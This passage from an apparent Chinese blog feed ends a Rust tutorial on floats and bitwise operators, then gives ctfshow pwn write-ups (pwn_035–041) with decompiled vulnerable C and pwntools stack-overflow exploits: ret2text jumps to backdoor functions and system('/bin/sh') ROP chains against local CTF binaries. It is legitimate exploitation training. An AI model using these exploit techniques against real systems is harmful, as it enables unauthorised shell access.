导致了如果在使用浮点数时不够谨慎，就可能造成危险，有两个原因：</p><ol><li><strong>浮点数往往是一个确切数字的近似表达</strong>，浮点数类型是基于二进制实现的，但是计算的数字往往是基于十进制的，例如<code>0,1</code>在二进制上并不存在精确的表达形式，但是在十进制上就存在。这种不匹配性导致一定的歧义性，更多的，虽然浮点数能代表真实的数值，但是由于底层格式问题，它往往受限于定长的浮点数精度，如果想要表达完全精准的真实数字，只有使用无限精度的浮点数才行。</li><li><strong>浮点数在某些特性上是反直觉的</strong> 例如大家都会觉得浮点数可以进行比较，一般情况下，确实可以使用<code>&lt; &gt; =&gt; = &lt;=</code>进行比较，但是在某些场景下，这种直觉上的比较特性反而会害了你。因为<code>f32</code>,<code>f64</code>上的比较运算实现的是<code>std::cmp::PartialEq</code>特征（类似其他语言的接口），但是并没有实现<code>std::cmp::Eq</code>特征，但是后者在其他数值类型上都有定义。比如说：<br><code>Rust</code>的<code>HashMap</code>数据结构，是一个KV类型的Hash Map实现，它对于<code>k</code>没有特定类型的限制，但是要求能用作<code>k</code>的类型必需实现了<code>std::cmp::Eq</code>特征，因此这意味着你无法使用浮点数作为<code>HashMap</code>的<code>key</code>，来存储键值对，但是作为对比，Rust的整数类型、字符串类型、布尔类型都实现了该特征，因此可以作为<code>HashMap</code>的<code>key</code>。<br>为了避免上面说的两个陷阱，你需要遵守以下准则：</li></ol><ul><li>避免在浮点数上测试相等性。</li><li>当结果在数学上可能存在未定义时，需要格外的小心。</li></ul><p>Rust的浮点数类型使用<code>NaN(not a number)</code>来处理数学上未定义的结果。并且所有跟<code>NaN</code>交互的操作，都会返回一个<code>NaN</code>，而且<code>NaN</code>不能用来比较。并且，可以使用<code>is_nan()</code>等方法，来判断一个数值是否是<code>NaN</code>。</p><p><strong>数学运算</strong>：<br>来看一个综合性的示例：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;  </span><br><span class="line">  <span class="comment">// 编译器会进行自动推导，给予twenty i32的类型  </span></span><br><span class="line">  <span class="keyword">let</span> <span class="variable">twenty</span> = <span class="number">20</span>;  </span><br><span class="line">  <span class="comment">// 显式类型标注  </span></span><br><span class="line">  <span class="keyword">let</span> <span class="variable">twenty_one</span>: <span class="type">i32</span> = <span class="number">21</span>;  </span><br><span class="line">  <span class="comment">//通过类型后缀的方式进行类型标注  </span></span><br><span class="line">  <span class="keyword">let</span> <span class="variable">twenty_two</span> = <span class="number">22i32</span>;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 只有同样的类型，才能进行运算  </span></span><br><span class="line">  <span class="keyword">let</span> <span class="variable">addition</span> = twenty + twenty_one + twenty_two;  </span><br><span class="line">  <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125; + &#123;&#125; + &#123;&#125; = &#123;&#125;&quot;</span>, twenty, twenty_one, twenty_two, addition);  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 对于较长的数字，可以使用_进行分割，提高可读性  </span></span><br><span class="line">  <span class="keyword">let</span> <span class="variable">one_million</span>: <span class="type">i64</span> = <span class="number">1_000_000</span>;  </span><br><span class="line">  <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, ont_million.<span class="title function_ invoke__">pow</span>(<span class="number">2</span>));  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 定义一个f32数组，其中42.0会自动被推导为f32类型  </span></span><br><span class="line">  <span class="keyword">let</span> <span class="variable">forty_twos</span> = [  </span><br><span class="line">    <span class="number">42.0</span>,  </span><br><span class="line">    <span class="number">42f32</span>,  </span><br><span class="line">    <span class="number">42.0_f32</span>,  </span><br><span class="line">  ];  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 打印数组中的第一个值，并控制小数位为2位  </span></span><br><span class="line">  <span class="built_in">println!</span>(<span class="string">&quot;&#123;:.2&#125;&quot;</span>, forty_twos[<span class="number">0</span>]);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>位运算</strong>：</p><p>与其他语言类似</p><table><thead><tr><th>运算符</th><th>说明</th></tr></thead><tbody><tr><td>&amp;位与</td><td>相同位置均为1时则为1，否则为0</td></tr><tr><td>|位或</td><td>相同位置只要有1则为1，否则为0</td></tr><tr><td>^异或</td><td>相同位置不相同则为1， 相同则为0</td></tr><tr><td>!位非</td><td>把位中的0和1相互取反，即0置为1，1置为0</td></tr><tr><td>&lt;&lt;左移</td><td>所有位向左移动指定位数，右位补0</td></tr><tr><td>&gt;&gt;右移</td><td>所有位向右移动指定位数，带符号移动（正数补0，负数补1）</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Rust基础学习&lt;/h1&gt;
&lt;h2 id=&quot;变量绑定与解构&quot;&gt;变量绑定与解构&lt;/h2&gt;
&lt;p&gt;变量绑定：&lt;code&gt;let a = &amp;quot;hello word&amp;quot;&lt;/code&gt;&lt;br&gt;
不可变变量声明：&lt;code&gt;let a = &amp;quot;hello wo</summary>
      
    
    
    
    <category term="算法" scheme="https://www.xvzhang.fun/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="RUST" scheme="https://www.xvzhang.fun/tags/RUST/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow_pwn练习</title>
    <link href="https://www.xvzhang.fun/posts/d602ccb2.html"/>
    <id>https://www.xvzhang.fun/posts/d602ccb2.html</id>
    <published>2025-05-07T07:13:19.000Z</published>
    <updated>2025-05-10T14:59:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1>栈溢出</h1><pre><code>## pwn_035</code></pre><p><em>正式开始栈溢出了，先来一个最最最最简单的吧</em></p><p>首先使用<code>checksec</code>查保护:<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/3939901a-35c1-47b4-8ecc-d3514682257c.png" alt="alt text"><br>32位程序，开启了堆栈不可执行保护。首先运行一下：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/9ea265b1-72db-412b-9685-c8a75e09feb9.png" alt="alt text"><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/4022c6aa-c589-49ad-b411-6d1ed19bcc06.png" alt="alt text"><br>发现他会打开根目录下的文件，但是并不对其进行输出。这里使用ida进行反编译：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/a8e2548d-f7b7-4162-aa33-922bb22a9fac.png" alt="alt text"><br>发现，程序读取<code>/ctfshow_flag</code>文件后存入<code>flag</code>变量中，但不打印，然后打印字符串，进入验证<code>argv[1]</code>的值，但是程序中并没有给定输入<code>argv</code>数组的功能，然后根据<code>argv[1]</code>的值输出不同的字符，其中，当<code>argc &gt;= 1</code>时，会进入ctfshow函数中，进入观察：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/aa89cb2a-e2f0-46ae-ad28-78ba2bf45169.png" alt="alt text"><br>发现使用<code>strcpy</code>函数将argv的值复制给dest变量中。<br>漏洞很明显，是由于<code>strcpy</code>函数未验证源字符串大小造成的栈溢出漏洞。这里的<code>dest</code>接收<code>0x68</code>大小的字符。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/1a465cf4-463b-46c3-98bf-ca302af2b14a.png" alt="alt text"><br>这里的dest相对ebp的偏移量为<code>0x6c</code>.<br>那么<code>argv</code>的值应该怎么控制呢，重新审计，发现原来该程序是通过命令行来接受参数的，这里给出chat的解释：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/0c61bd64-c8f6-4782-b208-807a646ea95b.png" alt="alt text"><br>那么就好控制了，我们只需要输入大于0x6c的值即可造成栈溢出漏洞。但是造成栈溢出的目的是为了读取flag，程序中已经读取了flag，应该如何使其输出出来呢。重新审计发现：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fgets</span>(flag, <span class="number">64</span>, stream);  </span><br><span class="line"><span class="built_in">signal</span>(<span class="number">11</span>, (<span class="type">__sighandler_t</span>)sigsegv_handler);</span><br></pre></td></tr></table></figure><p>这个函数没见过，给chat跑一下：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/79027758-8e1b-490a-ae51-d3fc7ba12cc3.png" alt="alt text"><br>通过chat的解释以及<a href="https://www.runoob.com/cprogramming/c-function-signal.html">菜鸟教程-signal函数</a>,我们知道了，当该函数发生非法访问存储器，如访问不存在的内存单元时，就会调用<code>sigsegv_handler</code>函数，我们跟进该函数看一下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __noreturn <span class="title">sigsegv_handler</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%s\n&quot;</span>, flag);  </span><br><span class="line">  <span class="built_in">fflush</span>(stderr);  </span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他就会打印出flag。所以当我们造成栈溢出漏洞时，其实就相当于非法访问存储器，自然便会调用函数打印flag。所以我们只需要输出<code>&gt;0x6c</code>个字节的内容即可获取flag。我们使用peda生成108字节的字符：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/55af9e78-f013-4e8f-abcf-12a364f0b45d.png" alt="alt text"><br>然后输入：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/9f01757c-f938-4538-bdd9-8652965c542e.png" alt="alt text"><br>成功读取到本地flag。</p><h2 id="pwn-036">pwn_036</h2><p><em>存在后门函数，如何利用？</em></p><p>本地运行，并使用<code>checksec</code>查一下保护：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/4122c990-3fb9-45dc-a73c-b4fe94e0b6fa.png" alt="alt text"><br>程序存在输入，并且栈可执行</p><p>markdown</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>1  <br>2  <br>3  <br>4  <br>5  <br>6  <br>7  <br>8</td><td>Arch:       i386-32-little       ✅ 32位程序，EIP 只有4字节，易于控制  <br>RELRO:      Partial RELRO        ✅ 没有完全保护 GOT，可以改 GOT  <br>Stack:      No canary found      ✅ 栈上无金丝雀，可以自由溢出返回地址  <br>NX:         NX unknown           ❓ 理论是栈不可执行，但实际 checksec 没识别出来  <br>PIE:        No PIE (0x8048000)   ✅ 程序地址固定（无地址随机化），容易找函数地址  <br>Stack:      Executable           ✅ 栈是可执行的！！可以直接打 shellcode  <br>RWX:        Has RWX segments     ✅ 程序有可读写执行段，可能可以写入并跳转  <br>Stripped:   No                   ✅ 没有被 strip，可以直接看到符号（如 main、func 等）</td></tr></tbody></table><p>接下来我们使用ida打开：<br>main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);  </span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);  </span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);  </span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);  </span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);  </span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);  </span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);  </span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);  </span><br><span class="line">  ctfshow(&amp;argc);  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ctfshow函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span>  </span><br><span class="line">&#123;  </span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF  </span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> gets(s);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ctfshow函数中使用gets函数来读取s，标准的栈溢出漏洞。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/e7593992-537a-40b1-8c7a-6efc78399ba9.png" alt="alt text"><br>我们将断点下在<code>0x08048619</code>处<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/82d4fd2d-94fb-400c-93e6-0e8beea411a3.png" alt="alt text"><br><code>esp</code>的地址为<code>0xffffd550</code>，<code>ebp</code>的地址为<code>0xffffd588</code>，<code>s</code>相对于<code>ebp</code>的索引为<code>ebp+0x28</code>，所以这里<code>s</code>相对<code>ebp</code>的偏移量为<code>0x28</code>。<br>接着找到存在<code>getflag</code>函数：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/1324378d-386f-435d-bcef-f62594bd7377.png" alt="alt text"><br>地址为：<code>0x08048586</code><br>所以我们的思路就是溢出到<code>getflag</code>函数处即可。<br>编写exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">getflag_addr = <span class="number">0x08048586</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + <span class="string">b&#x27;bbbb&#x27;</span> + p32(getflag_addr)  </span><br><span class="line">  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>成功获取到flag：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/650dd7ac-7bcf-478d-805f-d761075f80a4.png" alt="alt text"></p><h2 id="pwn-037">pwn_037</h2><p><em>32位的 system(“/bin/sh”) 后门函数给你</em></p><p>执行➕checksec：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/b4afa2e2-a4ae-4fa3-bce0-fb87a2141f6b.png" alt="alt text"><br>开启了栈不可执行保护。放入ida中进行分析：<br>反编译后的main函数、logo函数以及ctfshow函数<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/cdd99ca6-9ad6-4682-9fd3-1c7c2ac11119.png" alt="alt text"><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/8bcc85b5-0d56-46bb-8a3c-4af86cbcc439.png" alt="alt text"><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="alt text"><br>发现漏洞点应该在ctfshow函数中，因为这里预定义的buf数组的大小为14，而read允许读入的字节大小为<code>0x32 = 50</code>，所以这里存在栈溢出漏洞。<br>继续分析，发现存在system后门函数backdor：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/27ad285a-af30-4226-a6f2-610bd32ec58e.png" alt="alt text"><br>backdoor函数地址：<code>0x08048521</code><br>接下来我们计算偏移，buf相对于ebp的偏移为<code>0x12</code>。就下来我们编写exp<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/77b833fa-a6d4-4d85-9717-be56b2752284.png" alt="alt text"><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/2345cdb5-aa08-4160-897f-8e58f6d3da69.png" alt="alt text"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">backdoor_addr = <span class="number">0x08048521</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x12</span> + <span class="string">b&#x27;bbbb&#x27;</span> + p32(backdoor_addr)  </span><br><span class="line">  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>成功拿到本地shell<br>[<img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/8fd851b1-5ab5-45ee-a4ff-af3126cc03ee.png" alt="alt text"></p><h2 id="pwn-038">pwn_038</h2><p><em>64位的 system(“/bin/sh”) 后门函数给你</em></p><p>执行加checksec<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/3fffe326-87ec-4cb3-a13d-6963d017ecb4.png" alt="alt text"><br>与上题一样，输入然后推出，且仅开启了堆栈不可执行保护，不一样的是，本次的是64位程序。使用ida打开分析。<br>反编译，直接转到ctfshow函数中<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/94f2d0c7-851b-49ff-a60d-75f7682f7dcf.png" alt="alt text"><br>read栈溢出漏洞。并且存在后门地址backdoor，地址<code>0x0400657</code><br>[<img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/4ccc80f1-a7c2-46e5-a754-fc98e32bc4fa.png" alt="alt text"><br>计算偏移量为<code>0x0a</code>，这里需要注意的是，64位程序距离返回地址有8个字节。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/d2b7de98-c720-4851-a6bc-6b1bf0d9cd44.png" alt="alt text"><br>注意，这里是64位程序，与32位程序不同的是，这里我们需要考虑到堆栈平衡的情况：<br><strong>堆栈平衡</strong>：64位系统需要保持一个栈平衡，需要找栈lea的地址或者该函数结束即retn的地址，当我们在堆栈中进行堆栈的操作的时候，一定要保证在ret这条指令之前，esp指向的是我们压入栈中的地址，函数执行到ret执行之前，堆栈栈顶的地址一定要是call指令的下一条地址。<br>仿照上例，编写exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">backdoor_addr = <span class="number">0x0400657</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x0a</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x08</span> + p64(<span class="number">0x040066D</span>) + p64(backdoor_addr)  </span><br><span class="line">  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/3bc0f40b-630d-46f4-9d8f-affb98bdd0bd.png" alt="alt text"></p><h2 id="pwn-039">pwn_039</h2><p><em>32位的 system(); “/bin/sh”</em></p><p>运行+checksec，观察：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/5f9e3c02-26ab-4d87-bbed-1056d1491f1b.png" alt="alt text"><br>只开启堆栈不可执行保护，使用ida反编译，找到漏洞点<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/be14108f-6058-446c-a061-2594b96a6f9e.png" alt="alt text"><br>read函数的栈溢出漏洞，试寻找后门函数。在hint函数中找到system函数以及<code>/bin/sh</code>字符，但是并没有构成后门函数，所以我们这里需要构造<code>system('/bin/sh')</code>。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/f2d2a034-6a7e-4398-94c4-131e98706af6.png" alt="alt text"><br>找到<code>/bin/sh</code>的地址：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/7b9a4dab-20f7-4f7a-909c-6e660baf248c.png" alt="alt text"><br>接下来我们找到system@plt的地址：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/53429d25-7a61-4722-94d1-f5f256a45389.png" alt="alt text"><br>最后，我们需要计算可溢出字符串的偏移：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/ae27a232-7c65-4474-b270-db1577d95521.png" alt="alt text"><br>为<code>0x12 + 4</code><br>编写exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">binsh_addr = <span class="number">0x08048750</span>  </span><br><span class="line">system_plt = <span class="number">0x080483A0</span>  </span><br><span class="line">  </span><br><span class="line">payload = flat([ <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x16</span>, system_plt, <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr ])  </span><br><span class="line">  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn-040">pwn_040</h2><p><em>64位的 system(); “/bin/sh”</em></p><p>运行+checksec，可以看到只开启了NX保护<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/2d09990a-2ba5-46ba-a192-cb1f21960998.png" alt="alt text"><br>IDA反编译查看<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/57d948b2-d4a6-4dca-9211-dbc05d3192d6.png" alt="alt text"><br>read函数存在溢出，且存在system函数，查找是否存在<code>/bin/sh</code>字符串<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/faca264c-9779-4d07-be19-44cd25d1e273.png" alt="alt text"><br>计算偏移：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/43f3590a-2eb9-4942-9c91-1633c4033ed2.png" alt="alt text"><br>偏移量为<code>0x10</code><br>编写exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">bin_sh_addr = <span class="number">0x00400808</span>  </span><br><span class="line">system_plt = <span class="number">0x0400520</span>  </span><br><span class="line">pop_rdi_ret = <span class="number">0x004007e3</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x0A</span> + <span class="number">0x08</span>) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(<span class="number">0x04004fe</span>) + p64(system_plt)  </span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Just easy ret2text&amp;&amp;64bit\n&#x27;</span>)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/4f36c4d6-61f7-41e4-9321-2696dd03beba.png" alt="alt text"></p><h2 id="pwn-041">pwn_041</h2><p><em>32位的 system(); 但是没&quot;/bin/sh&quot; ，好像有其他的可以替代</em></p><p>使用checksec查保护并运行，获得基本信息，32位程序，仅开启NX保护。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/c48177ff-b504-4780-946a-67e0b6cc1f5a.png" alt="alt text"><br>使用ida反编译<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/ed7e0691-0b2b-4b68-9ccb-0153896804ac.png" alt="alt text"><br>存在read函数栈溢出，并且存在<code>system</code>函数，但不存在<code>/bin/sh</code>字符。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/a5b4ddba-a1ed-48b4-9116-11faa9ae3b12.png" alt="alt text"><br>原本准备在.bss段中写入<code>/bin/sh\x00</code>，来构造<code>system('/bin/sh')</code>，但是并没有找到可用的.bss段，继续审计代码，发现存在<code>sh</code>字符串。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/a0849e41-c1d9-48d0-b7e0-28a552082ce0.png" alt="alt text"><br>这里不得不提<code>/bin/sh</code>与<code>sh</code>之间的区别：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/b4ae491f-38a1-4d4e-97e3-80623b4e67dd.png" alt="alt text"><br><code>sh</code>是通过系统环境变量来启动一个名为sh的shell环境。而<code>/bin/sh</code>则是linux系统中默认的shell环境。<br>接下来计算偏移为<code>0x12</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/407ec63c-cc65-41f1-bae8-9da4536a6c2e.png" alt="alt text"></p><p>编写<code>exp</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 